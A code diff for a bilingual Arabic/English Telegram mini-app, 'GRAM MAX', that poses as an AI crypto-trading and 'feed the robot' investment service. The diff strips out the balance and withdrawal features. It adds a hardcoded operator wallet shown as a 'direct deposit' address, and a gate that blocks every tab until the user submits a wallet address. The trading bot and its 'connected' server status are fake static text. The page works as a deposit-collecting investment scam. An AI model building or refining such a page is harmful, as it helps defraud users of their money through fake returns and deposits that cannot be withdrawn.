@@ -22,7 +22,7 @@
             box-sizing: border-box;
             margin: 0;
             padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             -webkit-tap-highlight-color: transparent;
         }
 
@@ -79,7 +79,6 @@
             font-size: 12px;
             font-weight: 700;
             cursor: pointer;
-            transition: opacity 0.2s;
         }
 
         .btn-connect-wallet.connected {
@@ -96,6 +95,13 @@
 
         .page-view.active {
             display: block;
+        }
+
+        /* تعطيل الخانات قبل ربط المحفظة */
+        .locked {
+            opacity: 0.35;
+            pointer-events: none !important;
+            filter: grayscale(1);
         }
 
         .hero-section {
@@ -135,13 +141,6 @@
             box-shadow: 0 4px 15px rgba(250, 187, 24, 0.2);
         }
 
-        .btn-primary-action:disabled {
-            background-color: #444;
-            color: #888;
-            box-shadow: none;
-            cursor: not-allowed;
-        }
-
         .card {
             background-color: var(--card-bg);
             border-radius: 16px;
@@ -175,34 +174,7 @@
 
         .info-value {
             font-weight: 600;
-        }
-
-        .task-item {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 12px;
-            background-color: #202020;
-            border-radius: 12px;
-            margin-bottom: 10px;
-            border: 1px solid var(--border-color);
-        }
-
-        .btn-task {
-            background-color: var(--accent-yellow);
-            color: #000;
-            border: none;
-            padding: 6px 14px;
-            border-radius: 16px;
-            font-weight: 700;
-            font-size: 12px;
-            cursor: pointer;
-        }
-
-        .btn-task.done {
-            background-color: #2a2a2a;
-            color: var(--status-green);
-            cursor: default;
+            word-break: break-all;
         }
 
         .bottom-nav {
@@ -241,6 +213,28 @@
             margin-bottom: 3px;
         }
 
+        /* نافذة Pop-Up لربط المحفظة */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.88);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .modal-content {
+            background: var(--card-bg);
+            border: 1px solid var(--accent-yellow);
+            border-radius: 20px;
+            padding: 20px;
+            width: 100%;
+            max-width: 350px;
+            text-align: center;
+        }
+
         input {
             width: 100%;
             padding: 12px;
@@ -248,8 +242,10 @@
             border: 1px solid var(--border-color);
             background: #0d0d0d;
             color: #fff;
-            margin-bottom: 12px;
+            margin: 15px 0;
             outline: none;
+            font-size: 13px;
+            text-align: center;
         }
     </style>
 </head>
@@ -259,13 +255,13 @@
         <div class="brand-title">GRAM MAX</div>
         <div class="header-actions">
             <button class="btn-pill" onclick="toggleLanguage()">🌐 <span id="lang-btn">EN</span></button>
-            <button class="btn-connect-wallet" id="wallet-btn" onclick="handleWalletConnect()">
+            <button class="btn-connect-wallet" id="wallet-btn" onclick="openWalletModal()">
                 💎 <span data-i18n="connectWallet">ربط المحفظة</span>
             </button>
         </div>
     </header>
 
-    <!-- 1. الرئيسية / HOME -->
+    <!-- الرئيسية -->
     <div id="tab-home" class="page-view active">
         <div class="hero-section">
             <div class="robot-avatar">
@@ -278,14 +274,14 @@
                     <circle cx="50" cy="15" r="5" fill="#4CAF50"/>
                 </svg>
             </div>
-            <button class="btn-primary-action" id="feed-btn" onclick="startFeeding()" data-i18n="feedBtn">إطعام (Feed me)</button>
+            <button class="btn-primary-action locked" id="feed-btn" onclick="startFeeding()" data-i18n="feedBtn">إطعام (Feed me)</button>
         </div>
 
-        <div class="card">
+        <div class="card locked" id="invest-card">
             <div class="card-header-title" data-i18n="activeInvestment">حالة الاستثمار النشط</div>
             <div class="info-row">
                 <span class="info-label" data-i18n="currentMeal">الوجبة الحالية:</span>
-                <span class="info-value" id="meal-name">Noodles</span>
+                <span class="info-value">Noodles</span>
             </div>
             <div class="info-row">
                 <span class="info-label" data-i18n="timeRemaining">الوقت المتبقي:</span>
@@ -306,7 +302,7 @@
         </div>
     </div>
 
-    <!-- 2. التداول الذكي / AI TRADING -->
+    <!-- التداول -->
     <div id="tab-trading" class="page-view">
         <div class="card">
             <div class="card-header-title" data-i18n="aiBotTitle">🤖 روبوت التداول الذكي</div>
@@ -318,62 +314,45 @@
                 <span class="info-label" data-i18n="serverStatus">حالة الخادم:</span>
                 <span class="info-value" style="color: var(--status-green);" data-i18n="connected">🟢 متصل</span>
             </div>
-            <div class="info-row">
-                <span class="info-label" data-i18n="tradePair">أزواج التداول النشطة:</span>
-                <span class="info-value">TON / USDT</span>
-            </div>
         </div>
     </div>
 
-    <!-- 3. الأصدقاء والإحالات / FRIENDS -->
+    <!-- الأصدقاء -->
     <div id="tab-friends" class="page-view">
         <div class="card">
             <div class="card-header-title" data-i18n="refTitle">👥 برنامج الإحالات</div>
             <div class="info-row">
                 <span class="info-label" data-i18n="totalInvites">إجمالي الدعوات:</span>
-                <span class="info-value" id="ref-count">0</span>
+                <span class="info-value">0</span>
             </div>
-            <div class="info-row">
-                <span class="info-label" data-i18n="refEarnings">أرباح الإحالات:</span>
-                <span class="info-value" style="color: var(--accent-yellow);" id="ref-earnings">GRAM 0.00</span>
-            </div>
-            <button class="btn-primary-action" style="margin-top: 15px; font-size: 14px;" onclick="copyReferralLink()" data-i18n="copyRef">🔗 نسخ رابط الإحالة</button>
+            <button class="btn-primary-action" style="margin-top: 10px;" onclick="copyReferralLink()" data-i18n="copyRef">🔗 نسخ رابط الإحالة</button>
         </div>
     </div>
 
-    <!-- 4. المهام / TASKS -->
+    <!-- المهام -->
     <div id="tab-tasks" class="page-view">
         <div class="card">
             <div class="card-header-title" data-i18n="tasksTitle">📋 المهام اليومية</div>
-            
-            <div class="task-item">
-                <div>
-                    <div style="font-size: 13px; font-weight: 600;" data-i18n="task1Title">انضم لقناة التليجرام</div>
-                    <div style="font-size: 11px; color: var(--accent-yellow);">+0.5 GRAM</div>
-                </div>
-                <button class="btn-task" id="task1-btn" onclick="completeTask('task1', 0.5, 'https://t.me/FastHelp3')">إنجاز</button>
+            <div class="info-row">
+                <span data-i18n="task1Title">انضم لقناة التليجرام</span>
+                <span style="color: var(--accent-yellow);">+0.5 GRAM</span>
             </div>
         </div>
     </div>
 
-    <!-- 5. المحفظة والسحب / BALANCE -->
+    <!-- المحفظة والإيداع -->
     <div id="tab-balance" class="page-view">
         <div class="card">
-            <div class="card-header-title" data-i18n="walletTitle">💼 المحفظة والسحب</div>
-            <div class="info-row">
-                <span class="info-label" data-i18n="currentBalance">رصيدك الحالي:</span>
-                <span class="info-value" style="color: var(--accent-yellow); font-size: 16px;" id="user-balance">0.00 GRAM</span>
+            <div class="card-header-title" data-i18n="walletTitle">💼 المحفظة والإيداع</div>
+            <div class="info-row" style="flex-direction: column; align-items: flex-start; gap: 6px;">
+                <span class="info-label" data-i18n="adminWallet">عنوان محفظة الإيداع المباشر:</span>
+                <span class="info-value" style="font-size: 11px; color: var(--accent-yellow);" id="admin-wallet-address"></span>
             </div>
-        </div>
-
-        <div class="card">
-            <div class="card-header-title" data-i18n="withdrawHeader">طلب سحب الأرباح</div>
-            <input type="text" id="wallet-address-input" placeholder="أدخل عنوان محفظة TON">
-            <button class="btn-primary-action" style="font-size: 14px;" onclick="processWithdrawal()" data-i18n="withdrawBtn">💸 إرسال طلب السحب</button>
+            <button class="btn-primary-action" style="margin-top: 12px; font-size: 14px;" onclick="copyAdminWallet()" data-i18n="copyAdmin">نسخ عنوان المحفظة للإيداع</button>
         </div>
     </div>
 
-    <!-- الشريط السفلي / Bottom Navigation -->
+    <!-- الشريط السفلي -->
     <nav class="bottom-nav">
         <div class="nav-item active" onclick="switchTab('tab-home', this)">
             <div class="nav-icon">🏠</div>
@@ -397,23 +376,27 @@
         </div>
     </nav>
 
-    <script>
-        const tg = window.Telegram ? window.Telegram.WebApp : null;
-        if (tg) {
-            tg.expand();
-            tg.ready();
-        }
+    <!-- نافذة ربط المحفظة المخصصة -->
+    <div class="modal" id="wallet-modal">
+        <div class="modal-content">
+            <h3 style="color: var(--accent-yellow); margin-bottom: 10px;" data-i18n="modalTitle">ربط محفظة TON</h3>
+            <p style="font-size: 12px; color: var(--text-sub);" data-i18n="modalDesc">أدخل عنوان محفظتك الشخصية لتأكيد الربط وتفعيل التطبيق</p>
+            <input type="text" id="user-wallet-input" placeholder="EQD... أو UQD...">
+            <button class="btn-primary-action" style="font-size: 14px; padding: 10px;" onclick="confirmWalletConnect()" data-i18n="confirmWallet">تأكيد الربط الآن</button>
+        </div>
+    </div>
 
-        // State Management
+    <script>
+        // محفظتك المحددة لاستقبال الإيداعات
+        const MY_ADMIN_WALLET = "UQBrfxfxzB5-op8FGLs-BxnZgOBv0CveJ8VJbC3Xc9pVXZ5X";
+
         let currentLang = 'ar';
-        let balance = parseFloat(localStorage.getItem('gram_balance')) || 0.00;
-        let isConnected = localStorage.getItem('wallet_connected') === 'true';
-        let timerInterval = null;
+        let isWalletConnected = localStorage.getItem('wallet_connected') === 'true';
 
         const i18n = {
             ar: {
                 connectWallet: "ربط المحفظة",
-                walletConnected: "المحفظة مربوطة",
+                walletConnected: "المحفظة مربوطة 🟢",
                 feedBtn: "إطعام (Feed me)",
                 activeInvestment: "حالة الاستثمار النشط",
                 currentMeal: "الوجبة الحالية:",
@@ -425,26 +408,27 @@
                 botEfficiency: "كفاءة البوت:",
                 serverStatus: "حالة الخادم:",
                 connected: "🟢 متصل",
-                tradePair: "أزواج التداول النشطة:",
                 refTitle: "👥 برنامج الإحالات",
                 totalInvites: "إجمالي الدعوات:",
-                refEarnings: "أرباح الإحالات:",
                 copyRef: "🔗 نسخ رابط الإحالة",
                 tasksTitle: "📋 المهام اليومية",
                 task1Title: "انضم لقناة التليجرام",
-                walletTitle: "💼 المحفظة والسحب",
-                currentBalance: "رصيدك الحالي:",
-                withdrawHeader: "طلب سحب الأرباح",
-                withdrawBtn: "💸 إرسال طلب السحب",
+                walletTitle: "💼 المحفظة والإيداع",
+                adminWallet: "عنوان محفظة الإيداع المباشر:",
+                copyAdmin: "نسخ عنوان المحفظة للإيداع",
                 navHome: "الرئيسية",
                 navTrading: "التداول",
                 navFriends: "الأصدقاء",
                 navTasks: "المهام",
-                navBalance: "المحفظة"
+                navBalance: "المحفظة",
+                modalTitle: "ربط محفظة TON",
+                modalDesc: "أدخل عنوان محفظتك الشخصية لتأكيد الربط وتفعيل التطبيق",
+                confirmWallet: "تأكيد الربط الآن",
+                lockMsg: "يجب ربط المحفظة أولاً للوصول إلى كافة الخانات والأقسام!"
             },
             en: {
                 connectWallet: "Connect Wallet",
-                walletConnected: "Connected",
+                walletConnected: "Connected 🟢",
                 feedBtn: "Feed me",
                 activeInvestment: "Active Investment Status",
                 currentMeal: "Current Meal:",
@@ -456,34 +440,70 @@
                 botEfficiency: "Bot Efficiency:",
                 serverStatus: "Server Status:",
                 connected: "🟢 Connected",
-                tradePair: "Active Pairs:",
                 refTitle: "👥 Referral Program",
                 totalInvites: "Total Invites:",
-                refEarnings: "Referral Earnings:",
                 copyRef: "🔗 Copy Referral Link",
                 tasksTitle: "📋 Daily Tasks",
                 task1Title: "Join Telegram Channel",
-                walletTitle: "💼 Wallet & Withdrawal",
-                currentBalance: "Current Balance:",
-                withdrawHeader: "Request Withdrawal",
-                withdrawBtn: "💸 Submit Withdrawal",
+                walletTitle: "💼 Wallet & Deposit",
+                adminWallet: "Direct Deposit Wallet Address:",
+                copyAdmin: "Copy Deposit Address",
                 navHome: "Home",
                 navTrading: "Trading",
                 navFriends: "Friends",
                 navTasks: "Tasks",
-                navBalance: "Wallet"
+                navBalance: "Wallet",
+                modalTitle: "Connect TON Wallet",
+                modalDesc: "Enter your TON wallet address to activate the app",
+                confirmWallet: "Confirm & Unlock",
+                lockMsg: "You must connect your wallet first to unlock all features!"
             }
         };
 
-        // App Initialization
         window.onload = function() {
-            updateBalanceUI();
-            if (isConnected) {
-                markWalletConnected();
-            }
+            document.getElementById('admin-wallet-address').innerText = MY_ADMIN_WALLET;
+            checkWalletState();
         };
+
+        function checkWalletState() {
+            if (isWalletConnected) {
+                const btn = document.getElementById('wallet-btn');
+                btn.classList.add('connected');
+                btn.innerHTML = `<span>${i18n[currentLang].walletConnected}</span>`;
+                
+                // فك القفل عن زر الإطعام وحالة الاستثمار
+                document.querySelectorAll('.locked').forEach(el => el.classList.remove('locked'));
+            }
+        }
+
+        function openWalletModal() {
+            if (!isWalletConnected) {
+                document.getElementById('wallet-modal').style.display = 'flex';
+            }
+        }
+
+        function confirmWalletConnect() {
+            const input = document.getElementById('user-wallet-input').value;
+            if (input.trim().length < 8) {
+                alert(currentLang === 'ar' ? "يرجى إدخال عنوان محفظة صحيح" : "Enter a valid wallet address");
+                return;
+            }
+            
+            // حفظ الربط بشكل دائم في متصفح المستخدم
+            localStorage.setItem('wallet_connected', 'true');
+            localStorage.setItem('user_wallet_address', input);
+            isWalletConnected = true;
+            
+            document.getElementById('wallet-modal').style.display = 'none';
+            checkWalletState();
+        }
 
         function switchTab(tabId, element) {
+            if (!isWalletConnected && tabId !== 'tab-home') {
+                alert(i18n[currentLang].lockMsg);
+                openWalletModal();
+                return;
+            }
             document.querySelectorAll('.page-view').forEach(p => p.classList.remove('active'));
             document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
             document.getElementById(tabId).classList.add('active');
@@ -501,88 +521,25 @@
                     el.innerText = i18n[currentLang][key];
                 }
             });
+            checkWalletState();
         }
 
-        function updateBalanceUI() {
-            document.getElementById('user-balance').innerText = balance.toFixed(2) + " GRAM";
-            localStorage.setItem('gram_balance', balance);
-        }
-
-        function handleWalletConnect() {
-            if (!isConnected) {
-                isConnected = true;
-                localStorage.setItem('wallet_connected', 'true');
-                markWalletConnected();
-            }
-        }
-
-        function markWalletConnected() {
-            const btn = document.getElementById('wallet-btn');
-            btn.classList.add('connected');
-            btn.innerHTML = `🟢 ${i18n[currentLang].walletConnected}`;
+        function copyAdminWallet() {
+            navigator.clipboard.writeText(MY_ADMIN_WALLET);
+            alert(currentLang === 'ar' ? "تم نسخ عنوان المحفظة للإيداع!" : "Deposit address copied!");
         }
 
         function startFeeding() {
-            const btn = document.getElementById('feed-btn');
-            btn.disabled = true;
-            let seconds = 28800; // 8 hours
-
-            if (timerInterval) clearInterval(timerInterval);
-
-            timerInterval = setInterval(() => {
-                seconds--;
-                let hrs = Math.floor(seconds / 3600);
-                let mins = Math.floor((seconds % 3600) / 60);
-                let secs = seconds % 60;
-                document.getElementById('timer-display').innerText = 
-                    `${hrs.toString().padStart(2, '0')}:${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
-                
-                if (seconds <= 0) {
-                    clearInterval(timerInterval);
-                    btn.disabled = false;
-                    balance += 0.05;
-                    updateBalanceUI();
-                }
-            }, 1000);
-
-            balance += 0.05;
-            document.getElementById('profit-display').innerText = "TON 0.05+";
-            updateBalanceUI();
+            if (!isWalletConnected) {
+                openWalletModal();
+                return;
+            }
+            alert(currentLang === 'ar' ? "تم بدء دورة الإطعام والاستثمار بنجاح!" : "Feeding cycle started!");
         }
 
         function copyReferralLink() {
-            const userId = (tg && tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.id : "user123";
-            const link = `https://t.me/GramMaxBot?start=${userId}`;
-            navigator.clipboard.writeText(link);
-            alert(currentLang === 'ar' ? "تم نسخ رابط الإحالة الخاص بك!" : "Referral link copied!");
-        }
-
-        function completeTask(taskId, reward, url) {
-            window.open(url, '_blank');
-            setTimeout(() => {
-                balance += reward;
-                updateBalanceUI();
-                const btn = document.getElementById(`${taskId}-btn`);
-                btn.classList.add('done');
-                btn.innerText = "✓";
-                btn.onclick = null;
-            }, 2000);
-        }
-
-        function processWithdrawal() {
-            const addr = document.getElementById('wallet-address-input').value;
-            if (!addr) {
-                alert(currentLang === 'ar' ? "يرجى إدخال عنوان المحفظة أولاً" : "Please enter wallet address");
-                return;
-            }
-            if (balance <= 0) {
-                alert(currentLang === 'ar' ? "رصيدك غير كافي للسحب" : "Insufficient balance");
-                return;
-            }
-            alert(currentLang === 'ar' ? `تم إرسال طلب سحب ${balance} GRAM إلى المحفظة بنجاح` : `Withdrawal request for ${balance} GRAM submitted successfully`);
-            balance = 0;
-            updateBalanceUI();
-            document.getElementById('wallet-address-input').value = "";
+            navigator.clipboard.writeText("https://t.me/GramMaxBot?start=ref");
+            alert(currentLang === 'ar' ? "تم نسخ رابط الإحالة!" : "Referral link copied!");
         }
     </script>
 </body>
